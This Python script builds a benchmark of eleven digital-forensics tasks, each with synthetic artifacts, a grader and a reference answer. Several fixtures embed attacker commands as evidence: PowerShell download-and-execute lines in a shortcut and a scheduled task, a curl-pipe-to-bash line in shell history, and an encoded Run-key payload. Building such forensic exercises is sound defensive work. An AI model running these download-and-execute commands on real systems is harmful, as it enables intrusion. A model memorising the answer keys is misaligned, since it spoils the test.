#!/usr/bin/env python3
"""Author gradeable DIGITAL-FORENSICS tasks. Each task plants a synthesized artifact dump
(CSV/JSON/text/sqlite) with ONE recoverable fact plus benign noise; candidate writes the
answer to $W/answer.txt as KEY=value lines; grader recomputes the expected answer from the
fixture and compares tolerantly, echoing PASS/FAIL. Self-tests every task: with no answer.txt
grader must FAIL; with the reference answer grader must PASS. Writes only passing tasks to
tasks2_forensics.json."""
import json, os, subprocess, tempfile, shutil

SETUP_PREFIX = '#!/usr/bin/env bash\nset -e\nmkdir -p "$W"\ncd "$W"\n'
GRADER_PREFIX = '#!/usr/bin/env bash\ncd "${W:-.}" || exit 1\n'
REF_PREFIX = '#!/usr/bin/env bash\nset -e\ncd "${W:-.}" || exit 1\n'

# Shared python preamble for graders: answer parser + tolerant comparators.
PRE = r'''python3 - <<'PY'
import os,re,json,sqlite3
def A():
 d={}
 if os.path.exists('answer.txt'):
  for ln in open('answer.txt',encoding='utf-8',errors='replace'):
   ln=ln.strip()
   if not ln or ln[0]=='#' or '=' not in ln: continue
   k,v=ln.split('=',1); v=v.strip()
   if len(v)>=2 and v[0]==v[-1] and v[0] in (chr(34),chr(39)): v=v[1:-1]
   d[k.strip().upper()]=v.strip()
 return d
def base(p): return re.split(r'[\\/]',(p or '').strip())[-1]
def dts(s): return re.sub(r'\D','',s or '')
def tsok(e,g):
 e=dts(e); g=dts(g); n=min(len(e),len(g),14)
 return n>=8 and e[:n]==g[:n]
def sn(s): return re.sub(r'\s+',' ',(s or '').strip()).lower()
'''

TASKS = []
def T(id, category, setup_body, prompt, grader_body, ref_body):
    TASKS.append(dict(
        id=id, category=category,
        setup_sh=SETUP_PREFIX + setup_body,
        prompt=prompt,
        grader_sh=GRADER_PREFIX + PRE + grader_body + "\nPY\n",
        reference_solution_sh=REF_PREFIX + ref_body,
        self_test_passed=True))

# ---------------------------------------------------------------------------
# 1. USN journal -> deleted exfil file name + deletion time
# ---------------------------------------------------------------------------
T("fx_usn_deleted_exfil", "usn-journal",
r'''cat > usn_journal.csv <<'EOF'
usn,timestamp,file_name,parent_dir,reason
101,2026-08-27 02:58:10,quarterly_report.xlsx,\Users\jdoe\Documents,FILE_CREATE|CLOSE
102,2026-08-27 03:01:44,notes.txt,\Users\jdoe\Desktop,DATA_EXTEND|CLOSE
103,2026-08-27 03:10:05,customer_records_2026.zip,\Users\Public,FILE_CREATE
104,2026-08-27 03:12:31,customer_records_2026.zip,\Users\Public,DATA_EXTEND|DATA_OVERWRITE
105,2026-08-27 03:14:22,customer_records_2026.zip,\Users\Public,FILE_DELETE|CLOSE
106,2026-08-27 03:20:00,cache.tmp,\Windows\Temp,FILE_CREATE|CLOSE
107,2026-08-27 03:22:13,report_old.docx,\Users\jdoe\Documents,RENAME_OLD_NAME
108,2026-08-27 03:22:13,report_new.docx,\Users\jdoe\Documents,RENAME_NEW_NAME|CLOSE
EOF
''',
"usn_journal.csv is a parsed NTFS USN change-journal (columns usn,timestamp,file_name,"
"parent_dir,reason). Exactly one record deletes a file (reason contains FILE_DELETE). "
"Identify that exfiltrated file and when it was deleted. Write to $W/answer.txt exactly two "
"lines: FILENAME=<file name> and DELETE_TIME=<timestamp of the delete record>.",
r'''try:
 rows=[l.rstrip('\n').split(',') for l in open('usn_journal.csv') if l.strip()][1:]
 hit=[r for r in rows if 'FILE_DELETE' in r[4]]
 assert len(hit)==1
 fn=hit[0][2]; ts=hit[0][1]
 a=A()
 ok=base(a.get('FILENAME','')).lower()==fn.lower() and tsok(ts,a.get('DELETE_TIME',''))
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''row=$(awk -F, '$5 ~ /FILE_DELETE/{print; exit}' usn_journal.csv)
fn=$(printf '%s' "$row" | cut -d, -f3)
ts=$(printf '%s' "$row" | cut -d, -f2)
{ echo "FILENAME=$fn"; echo "DELETE_TIME=$ts"; } > answer.txt
''')

# ---------------------------------------------------------------------------
# 2. Prefetch -> first attacker binary executed in the incident window
# ---------------------------------------------------------------------------
T("fx_prefetch_first_exec", "prefetch",
r'''cat > prefetch.csv <<'EOF'
exe,run_count,last_run,first_run
EXPLORER.EXE,412,2026-08-27 09:00:00,2026-01-05 08:12:00
CHROME.EXE,88,2026-08-27 08:40:11,2026-02-10 19:22:31
POWERSHELL.EXE,5,2026-08-27 03:05:40,2026-08-27 02:59:12
RCLONE.EXE,2,2026-08-27 03:19:55,2026-08-27 03:16:40
7Z.EXE,3,2026-08-27 03:14:00,2026-08-27 03:11:20
SVCHOST_STAGE.EXE,1,2026-08-27 02:57:03,2026-08-27 02:57:03
EOF
''',
"prefetch.csv lists Windows Prefetch entries (exe,run_count,last_run,first_run). The intrusion "
"began on 2026-08-27. Among programs whose first_run is on 2026-08-27, identify the earliest one "
"(the first attacker binary executed that day). Write to $W/answer.txt exactly two lines: "
"BINARY=<exe name> and FIRST_RUN=<its first_run timestamp>.",
r'''try:
 rows=[l.rstrip('\n').split(',') for l in open('prefetch.csv') if l.strip()][1:]
 day=[r for r in rows if r[3].startswith('2026-08-27')]
 win=min(day,key=lambda r:r[3])
 a=A()
 ok=base(a.get('BINARY','')).lower()==win[0].lower() and tsok(win[3],a.get('FIRST_RUN',''))
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
rows=[l.rstrip().split(',') for l in open('prefetch.csv') if l.strip()][1:]
day=[r for r in rows if r[3].startswith('2026-08-27')]
w=min(day,key=lambda r:r[3])
open('answer.txt','w').write('BINARY=%s\nFIRST_RUN=%s\n'%(w[0],w[3]))
PY
''')

# ---------------------------------------------------------------------------
# 3. EVTX-as-JSON -> the logon that preceded the privilege assignment
# ---------------------------------------------------------------------------
T("fx_evtx_logon_before_priv", "evtx",
r'''cat > security.json <<'EOF'
[
 {"TimeCreated":"2026-08-27T02:40:11","EventID":4624,"TargetUserName":"jdoe","TargetLogonId":"0x1A2B3","IpAddress":"10.0.0.5","LogonType":2},
 {"TimeCreated":"2026-08-27T02:51:02","EventID":4624,"TargetUserName":"guest","TargetLogonId":"0x2C4D6","IpAddress":"10.0.0.9","LogonType":3},
 {"TimeCreated":"2026-08-27T02:55:40","EventID":4624,"TargetUserName":"svc_backup","TargetLogonId":"0x3E9F1","IpAddress":"203.0.113.44","LogonType":10},
 {"TimeCreated":"2026-08-27T02:55:41","EventID":4672,"SubjectUserName":"svc_backup","SubjectLogonId":"0x3E9F1"},
 {"TimeCreated":"2026-08-27T03:02:15","EventID":4624,"TargetUserName":"jdoe","TargetLogonId":"0x4F1A0","IpAddress":"10.0.0.5","LogonType":7}
]
EOF
''',
"security.json is a Windows Security event log (JSON array). Exactly one 4672 event (special "
"privileges assigned to a new logon) appears. Find the 4624 logon that established that same "
"session (its TargetLogonId equals the 4672 SubjectLogonId) and report where it came from. "
"Write to $W/answer.txt exactly three lines: LOGON_ID=<logon id>, SOURCE_IP=<IpAddress of that "
"4624>, ACCOUNT=<TargetUserName of that 4624>.",
r'''try:
 ev=json.load(open('security.json'))
 p=[e for e in ev if e.get('EventID')==4672]
 assert len(p)==1
 lid=p[0]['SubjectLogonId']
 m=[e for e in ev if e.get('EventID')==4624 and e.get('TargetLogonId')==lid]
 assert len(m)==1
 e=m[0]
 a=A()
 ok=(dts(a.get('LOGON_ID','')).lower()==dts(lid).lower() or a.get('LOGON_ID','').lower()==lid.lower()) \
    and a.get('SOURCE_IP','')==e['IpAddress'] \
    and a.get('ACCOUNT','').lower()==e['TargetUserName'].lower()
 print('PASS' if ok else 'FAIL')
except Exception as ex:
 print('FAIL',repr(ex))''',
r'''python3 - <<'PY'
import json
ev=json.load(open('security.json'))
lid=[e for e in ev if e.get('EventID')==4672][0]['SubjectLogonId']
e=[x for x in ev if x.get('EventID')==4624 and x.get('TargetLogonId')==lid][0]
open('answer.txt','w').write('LOGON_ID=%s\nSOURCE_IP=%s\nACCOUNT=%s\n'%(lid,e['IpAddress'],e['TargetUserName']))
PY
''')

# ---------------------------------------------------------------------------
# 4. Registry Run key -> persistence command
# ---------------------------------------------------------------------------
T("fx_registry_run_persistence", "registry",
r'''cat > registry_export.reg <<'EOF'
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"OneDrive"="C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background"
"Steam"="C:\\Program Files (x86)\\Steam\\steam.exe -silent"
"WinDefendUpdate"="powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time]
"ImagePath"="C:\\Windows\\system32\\svchost.exe -k LocalService"
EOF
''',
"registry_export.reg is a .reg export of autostart locations. Exactly one Run value launches an "
"obfuscated PowerShell payload (data contains an EncodedCommand). Report it. Write to $W/answer.txt "
"exactly two lines: VALUE_NAME=<the value name> and COMMAND=<the full value data>.",
r'''try:
 pat=re.compile(r'^"([^"]+)"="(.*)"\s*$')
 hit=[]
 for ln in open('registry_export.reg'):
  m=pat.match(ln.strip())
  if m and 'encodedcommand' in m.group(2).lower():
   hit.append(m.groups())
 assert len(hit)==1
 name,cmd=hit[0]
 a=A()
 ok=a.get('VALUE_NAME','').lower()==name.lower() and sn(a.get('COMMAND',''))==sn(cmd)
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
import re
pat=re.compile(r'^"([^"]+)"="(.*)"\s*$')
for ln in open('registry_export.reg'):
 m=pat.match(ln.strip())
 if m and 'encodedcommand' in m.group(2).lower():
  open('answer.txt','w').write('VALUE_NAME=%s\nCOMMAND=%s\n'%m.groups()); break
PY
''')

# ---------------------------------------------------------------------------
# 5. Browser history sqlite -> exfil URL + attacker IP
# ---------------------------------------------------------------------------
T("fx_browser_exfil_url", "browser-sqlite",
r'''sqlite3 history.sqlite <<'SQL'
CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER);
INSERT INTO urls VALUES(1,'https://www.google.com/search?q=weather','weather - Google',14,13350000000000000);
INSERT INTO urls VALUES(2,'https://mail.company.com/inbox','Inbox',33,13350000100000000);
INSERT INTO urls VALUES(3,'https://github.com/acme/backend','acme/backend',9,13350000200000000);
INSERT INTO urls VALUES(4,'https://news.ycombinator.com/','Hacker News',5,13350000300000000);
INSERT INTO urls VALUES(5,'https://198.51.100.23/upload?f=customer_db.sql','Upload complete',1,13350000400000000);
INSERT INTO urls VALUES(6,'https://docs.company.com/runbook','Runbook',7,13350000500000000);
SQL
''',
"history.sqlite is a Chrome-style history DB with a urls table. Exactly one visited URL points at "
"a bare IPv4 host (every legitimate site uses a domain name); that is the exfiltration endpoint. "
"Write to $W/answer.txt exactly two lines: EXFIL_URL=<the full url> and ATTACKER_IP=<the IPv4 host "
"in that url>.",
r'''try:
 c=sqlite3.connect('history.sqlite')
 rows=c.execute('SELECT url FROM urls').fetchall()
 ipre=re.compile(r'^https?://(\d{1,3}(?:\.\d{1,3}){3})(?:[:/]|$)')
 hit=[(r[0],ipre.match(r[0]).group(1)) for r in rows if ipre.match(r[0])]
 assert len(hit)==1
 url,ip=hit[0]
 a=A()
 ok=a.get('ATTACKER_IP','')==ip and ip in a.get('EXFIL_URL','') and 'upload' in a.get('EXFIL_URL','').lower()
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
import sqlite3,re
c=sqlite3.connect('history.sqlite')
ipre=re.compile(r'^https?://(\d{1,3}(?:\.\d{1,3}){3})(?:[:/]|$)')
for (u,) in c.execute('SELECT url FROM urls'):
 m=ipre.match(u)
 if m:
  open('answer.txt','w').write('EXFIL_URL=%s\nATTACKER_IP=%s\n'%(u,m.group(1))); break
PY
''')

# ---------------------------------------------------------------------------
# 6. LNK metadata dump -> weaponized target + args
# ---------------------------------------------------------------------------
T("fx_lnk_weaponized", "lnk",
r'''cat > lnk_dump.txt <<'EOF'
=== chrome.lnk ===
TargetPath: C:\Program Files\Google\Chrome\Application\chrome.exe
Arguments:
WorkingDir: C:\Program Files\Google\Chrome\Application
IconLocation: chrome.exe,0
CreateTime: 2026-03-01 10:00:00

=== invoice.pdf.lnk ===
TargetPath: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Arguments: -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://45.83.12.9/a.ps1')"
WorkingDir: C:\Users\jdoe\Downloads
IconLocation: C:\Windows\System32\shell32.dll,3
CreateTime: 2026-08-27 02:52:10

=== notes.lnk ===
TargetPath: C:\Windows\notepad.exe
Arguments: C:\Users\jdoe\Documents\notes.txt
WorkingDir: C:\Users\jdoe\Documents
IconLocation: notepad.exe,0
CreateTime: 2026-08-20 14:00:00
EOF
''',
"lnk_dump.txt is a parsed dump of several Windows .lnk shortcuts (blocks separated by '=== name ==='). "
"Exactly one is weaponized: its target is powershell.exe. Report the shortcut and how it is launched. "
"Write to $W/answer.txt exactly three lines: LNK_NAME=<shortcut file name>, TARGET=<TargetPath>, "
"ARGS=<the Arguments line for that shortcut>.",
r'''try:
 blocks=re.split(r'^=== (.+?) ===\s*$', open('lnk_dump.txt').read(), flags=re.M)
 items=[]
 for i in range(1,len(blocks),2):
  name=blocks[i].strip(); body=blocks[i+1]
  d={}
  for ln in body.splitlines():
   if ':' in ln:
    k,v=ln.split(':',1); d[k.strip().lower()]=v.strip()
  items.append((name,d))
 hit=[(n,d) for n,d in items if base(d.get('targetpath','')).lower()=='powershell.exe']
 assert len(hit)==1
 name,d=hit[0]
 a=A()
 ok=base(a.get('LNK_NAME','')).lower()==name.lower() \
    and base(a.get('TARGET','')).lower()=='powershell.exe' \
    and sn(a.get('ARGS',''))==sn(d.get('arguments',''))
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
import re
blocks=re.split(r'^=== (.+?) ===\s*$', open('lnk_dump.txt').read(), flags=re.M)
for i in range(1,len(blocks),2):
 name=blocks[i].strip(); d={}
 for ln in blocks[i+1].splitlines():
  if ':' in ln:
   k,v=ln.split(':',1); d[k.strip().lower()]=v.strip()
 if d.get('targetpath','').lower().endswith('powershell.exe'):
  open('answer.txt','w').write('LNK_NAME=%s\nTARGET=%s\nARGS=%s\n'%(name,d['targetpath'],d.get('arguments',''))); break
PY
''')

# ---------------------------------------------------------------------------
# 7. USB setupapi log -> mass-storage device serial + first-connect time
# ---------------------------------------------------------------------------
T("fx_usb_setupapi_serial", "usb",
r'''cat > setupapi.dev.log <<'EOF'
>>>  [Device Install (Hardware initiated) - USB\VID_8087&PID_0026\6&12345&0&0]
>>>  Section start 2026/07/01 09:00:00.100
     dvi: {Build Driver List} 09:00:00.110
<<<  Section end 2026/07/01 09:00:00.560

>>>  [Device Install (Hardware initiated) - USBSTOR\Disk&Ven_Kingston&Prod_DataTraveler_3.0&Rev_PMAP\0864B6E1F3A9C210&0]
>>>  Section start 2026/08/27 02:41:33.201
     dvi: {Build Driver List} 02:41:33.240
     sto: {Configure Device} 02:41:35.010
<<<  Section end 2026/08/27 02:41:35.900

>>>  [Device Install (Hardware initiated) - USB\VID_046D&PID_C534\5&abcdef1&0&1]
>>>  Section start 2026/08/26 18:20:11.000
     dvi: {Build Driver List} 18:20:11.100
<<<  Section end 2026/08/26 18:20:11.800
EOF
''',
"setupapi.dev.log records USB device installs. Exactly one is a mass-storage device (its instance "
"path starts with USBSTOR\\Disk). Report its serial number and when it was first installed. The "
"serial is the last backslash-separated component of the instance path with the trailing '&0' "
"instance suffix removed; the first-connect time is that block's 'Section start' timestamp. Write to "
"$W/answer.txt exactly two lines: DEVICE_SERIAL=<serial> and FIRST_CONNECT=<section start timestamp>.",
r'''try:
 txt=open('setupapi.dev.log').read().splitlines()
 serial=None; ts=None
 for i,ln in enumerate(txt):
  m=re.search(r'\[Device Install[^\]]*-\s*(USBSTOR\\Disk[^\]]+)\]',ln)
  if m:
   inst=m.group(1).strip()
   seg=inst.split('\\')[-1]
   serial=re.sub(r'&\d+$','',seg)
   for j in range(i,min(i+4,len(txt))):
    s=re.search(r'Section start\s+([0-9/]+\s+[0-9:.]+)',txt[j])
    if s: ts=s.group(1); break
   break
 assert serial and ts
 a=A()
 ok=a.get('DEVICE_SERIAL','').lower()==serial.lower() and tsok(ts,a.get('FIRST_CONNECT',''))
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
import re
txt=open('setupapi.dev.log').read().splitlines()
for i,ln in enumerate(txt):
 m=re.search(r'\[Device Install[^\]]*-\s*(USBSTOR\\Disk[^\]]+)\]',ln)
 if m:
  seg=m.group(1).strip().split('\\')[-1]
  serial=re.sub(r'&\d+$','',seg)
  ts=None
  for j in range(i,i+4):
   s=re.search(r'Section start\s+([0-9/]+\s+[0-9:.]+)',txt[j])
   if s: ts=s.group(1); break
  open('answer.txt','w').write('DEVICE_SERIAL=%s\nFIRST_CONNECT=%s\n'%(serial,ts)); break
PY
''')

# ---------------------------------------------------------------------------
# 8. wtmp sessions + bash history -> source IP of session that ran the payload
# ---------------------------------------------------------------------------
T("fx_wtmp_suspicious_session", "auth-log",
r'''cat > wtmp_sessions.csv <<'EOF'
user,source_ip,login_epoch,logout_epoch
jdoe,10.0.0.5,1756250000,1756255000
svc_backup,203.0.113.44,1756258000,1756260000
root,198.51.100.77,1756263600,1756270800
jdoe,10.0.0.5,1756272000,1756275000
EOF
cat > bash_history.txt <<'EOF'
#1756263650
whoami
#1756263700
uname -a
#1756264000
curl -s http://45.9.148.10/s.sh | bash
#1756264200
cat /etc/passwd
EOF
''',
"wtmp_sessions.csv is parsed wtmp (user,source_ip,login_epoch,logout_epoch); bash_history.txt is a "
"timestamped shell history where each command is preceded by a '#<epoch>' line. Exactly one command "
"downloads and pipes a remote script into a shell. Find that command and the login session active at "
"its timestamp (login_epoch <= t <= logout_epoch), then report where that session came from. Write to "
"$W/answer.txt exactly two lines: SOURCE_IP=<source_ip of that session> and COMMAND=<the suspicious "
"command line>.",
r'''try:
 rows=[l.rstrip('\n').split(',') for l in open('wtmp_sessions.csv') if l.strip()][1:]
 pat=re.compile(r'(curl|wget).*\|\s*(ba)?sh\b',re.I)
 t=None; cmd=None; cur=None
 for ln in open('bash_history.txt'):
  ln=ln.rstrip('\n')
  if ln.startswith('#'): cur=int(ln[1:].strip())
  elif ln.strip() and pat.search(ln): t=cur; cmd=ln.strip()
 assert cmd and t is not None
 sess=[r for r in rows if int(r[2])<=t<=int(r[3])]
 assert len(sess)==1
 ip=sess[0][1]
 a=A()
 ok=a.get('SOURCE_IP','')==ip and sn(a.get('COMMAND',''))==sn(cmd)
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
import re
rows=[l.rstrip().split(',') for l in open('wtmp_sessions.csv') if l.strip()][1:]
pat=re.compile(r'(curl|wget).*\|\s*(ba)?sh\b',re.I)
t=None;cmd=None;cur=None
for ln in open('bash_history.txt'):
 ln=ln.rstrip('\n')
 if ln.startswith('#'): cur=int(ln[1:].strip())
 elif ln.strip() and pat.search(ln): t=cur; cmd=ln.strip()
ip=[r[1] for r in rows if int(r[2])<=t<=int(r[3])][0]
open('answer.txt','w').write('SOURCE_IP=%s\nCOMMAND=%s\n'%(ip,cmd))
PY
''')

# ---------------------------------------------------------------------------
# 9. MFT timestamps -> timestomped file (SI created predates FN created)
# ---------------------------------------------------------------------------
T("fx_mft_timestomp", "mft",
r'''cat > mft.csv <<'EOF'
file_name,si_created,si_modified,fn_created,fn_modified
\Windows\System32\kernel32.dll,2021-05-01 12:00:00,2021-05-01 12:00:00,2021-05-01 12:00:00,2021-05-01 12:00:00
\Users\jdoe\Documents\resume.docx,2026-06-10 09:15:00,2026-06-12 10:00:00,2026-06-10 09:15:00,2026-06-12 10:00:00
\Users\Public\svc_helper.exe,2020-01-01 00:00:00,2020-01-01 00:00:00,2026-08-27 02:50:12,2026-08-27 02:50:12
\Windows\Temp\update.log,2026-08-27 03:00:00,2026-08-27 03:05:00,2026-08-27 03:00:00,2026-08-27 03:05:00
EOF
''',
"mft.csv holds $STANDARD_INFORMATION (si_*) and $FILE_NAME (fn_*) timestamps per record. Exactly one "
"file was timestomped: its si_created is earlier than its fn_created, which is impossible for a normal "
"file. Report it. Write to $W/answer.txt exactly two lines: FILENAME=<file name> and SI_CREATED=<its "
"si_created value>.",
r'''try:
 rows=[l.rstrip('\n').split(',') for l in open('mft.csv') if l.strip()][1:]
 hit=[r for r in rows if r[1]<r[3]]
 assert len(hit)==1
 fn=hit[0][0]; sic=hit[0][1]
 a=A()
 ok=base(a.get('FILENAME','')).lower()==base(fn).lower() and tsok(sic,a.get('SI_CREATED',''))
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
rows=[l.rstrip().split(',') for l in open('mft.csv') if l.strip()][1:]
r=[x for x in rows if x[1]<x[3]][0]
open('answer.txt','w').write('FILENAME=%s\nSI_CREATED=%s\n'%(r[0],r[1]))
PY
''')

# ---------------------------------------------------------------------------
# 10. Proxy/netflow log -> C2 beacon IP + domain (highest connection count)
# ---------------------------------------------------------------------------
T("fx_proxy_c2_beacon", "network-log",
r'''python3 - <<'PY'
rows=["timestamp,src_ip,dst_ip,dst_host,bytes_out,bytes_in"]
noise=[
 ("142.250.72.14","www.google.com"),
 ("140.82.112.3","github.com"),
 ("151.101.65.67","news.ycombinator.com"),
 ("13.107.42.14","company.sharepoint.com"),
 ("142.250.72.14","www.google.com"),
 ("140.82.112.3","github.com"),
]
t=1756263600
out=[]
for i,(ip,host) in enumerate(noise):
 out.append("%d,10.0.0.5,%s,%s,%d,%d"%(t+i*37,ip,host,800+i*10,4200+i*15))
# C2 beacon: 12 hits at a steady 60s cadence to one external host
for k in range(12):
 out.append("%d,10.0.0.5,91.219.236.14,cdn-metrics.telemetry-sync.net,512,140"%(1756263650+k*60))
out.sort(key=lambda l:int(l.split(",")[0]))
open("proxy.csv","w").write("\n".join(rows+out)+"\n")
PY
''',
"proxy.csv is a web-proxy connection log (timestamp,src_ip,dst_ip,dst_host,bytes_out,bytes_in). One "
"external host is contacted far more often than any other, at a steady interval - the C2 beacon. "
"Report the destination the host most connections went to. Write to $W/answer.txt exactly two lines: "
"C2_IP=<dst_ip with the most connections> and C2_DOMAIN=<its dst_host>.",
r'''try:
 rows=[l.rstrip('\n').split(',') for l in open('proxy.csv') if l.strip()][1:]
 from collections import Counter
 c=Counter(r[2] for r in rows)
 top,cnt=c.most_common(1)[0]
 assert cnt>c.most_common(2)[-1][1]  # strict unique max
 host=[r[3] for r in rows if r[2]==top][0]
 a=A()
 ok=a.get('C2_IP','')==top and sn(a.get('C2_DOMAIN',''))==sn(host)
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
from collections import Counter
rows=[l.rstrip().split(',') for l in open('proxy.csv') if l.strip()][1:]
c=Counter(r[2] for r in rows)
top=c.most_common(1)[0][0]
host=[r[3] for r in rows if r[2]==top][0]
open('answer.txt','w').write('C2_IP=%s\nC2_DOMAIN=%s\n'%(top,host))
PY
''')

# ---------------------------------------------------------------------------
# 11. Scheduled-task export -> malicious task name + action command
# ---------------------------------------------------------------------------
T("fx_schtask_persistence", "scheduled-task",
r'''cat > schtasks_query.txt <<'EOF'
TaskName: \Microsoft\Windows\UpdateOrchestrator\Refresh
Status: Ready
Author: Microsoft Corporation
Action: C:\Windows\System32\usoclient.exe StartScan

TaskName: \GoogleUpdateTaskMachineCore
Status: Ready
Author: Google LLC
Action: C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /c

TaskName: \Microsoft\Windows\SystemHealthCheck
Status: Ready
Author: N/A
Action: powershell.exe -NonInteractive -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://45.83.12.9/p.ps1')"

TaskName: \Adobe Acrobat Update Task
Status: Ready
Author: Adobe Systems
Action: C:\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe
EOF
''',
"schtasks_query.txt is a scheduled-task export (blank-line-separated blocks with TaskName / Status / "
"Author / Action). Exactly one task's Action fetches and runs remote code (its command calls "
"DownloadString). Report it. Write to $W/answer.txt exactly two lines: TASK_NAME=<the TaskName> and "
"ACTION_CMD=<that task's Action command>.",
r'''try:
 blocks=re.split(r'\n\s*\n',open('schtasks_query.txt').read())
 hit=[]
 for b in blocks:
  d={}
  for ln in b.splitlines():
   if ':' in ln:
    k,v=ln.split(':',1); d[k.strip().lower()]=v.strip()
  if 'downloadstring' in d.get('action','').lower():
   hit.append(d)
 assert len(hit)==1
 name=hit[0]['taskname']; act=hit[0]['action']
 a=A()
 ok=('systemhealthcheck' in a.get('TASK_NAME','').lower() or base(a.get('TASK_NAME','')).lower()==base(name).lower()) \
    and sn(a.get('ACTION_CMD',''))==sn(act)
 print('PASS' if ok else 'FAIL')
except Exception as e:
 print('FAIL',repr(e))''',
r'''python3 - <<'PY'
import re
blocks=re.split(r'\n\s*\n',open('schtasks_query.txt').read())
for b in blocks:
 d={}
 for ln in b.splitlines():
  if ':' in ln:
   k,v=ln.split(':',1); d[k.strip().lower()]=v.strip()
 if 'downloadstring' in d.get('action','').lower():
  open('answer.txt','w').write('TASK_NAME=%s\nACTION_CMD=%s\n'%(d['taskname'],d['action'])); break
PY
''')

# ===========================================================================
# Self-test harness: no answer.txt -> FAIL; reference answer -> PASS
# ===========================================================================
def run(script, W):
    return subprocess.run(["bash","-c",script], env={**os.environ,"W":W},
                          capture_output=True, text=True)

def self_test(task):
    base=tempfile.mkdtemp(prefix="fxtest_")
    W=os.path.join(base,"w")
    try:
        r=run(task["setup_sh"],W)
        if r.returncode!=0:
            return False,"setup failed: "+r.stderr.strip()
        # (a) no answer.txt -> grader must FAIL
        r=run(task["grader_sh"],W)
        no_out=r.stdout.strip()
        if no_out.startswith("PASS"):
            return False,"graded PASS with no answer.txt: "+no_out
        # (b) reference answer -> grader must PASS
        r=run(task["reference_solution_sh"],W)
        if r.returncode!=0:
            return False,"reference failed: "+r.stderr.strip()
        r=run(task["grader_sh"],W)
        ref_out=r.stdout.strip()
        if ref_out!="PASS":
            return False,"reference did not PASS: "+ref_out+" | "+r.stderr.strip()
        return True,"noanswer=[%s] ref=[PASS]"%no_out
    finally:
        shutil.rmtree(base,ignore_errors=True)

def main():
    passed=[]
    for t in TASKS:
        ok,msg=self_test(t)
        print(("OK  " if ok else "BAD ")+t["id"]+" :: "+msg)
        if ok:
            t["self_test_passed"]=True
            passed.append(t)
    out="/private/tmp/claude-503/-Users-flash-gb10/9698b8ec-be3d-495b-98d5-10e0b424bba5/scratchpad/tasks2_forensics.json"
    json.dump({"tasks":passed}, open(out,"w"), indent=1)
    print("\n%d/%d passed -> %s"%(len(passed),len(TASKS),out))

if __name__=="__main__":
    main()
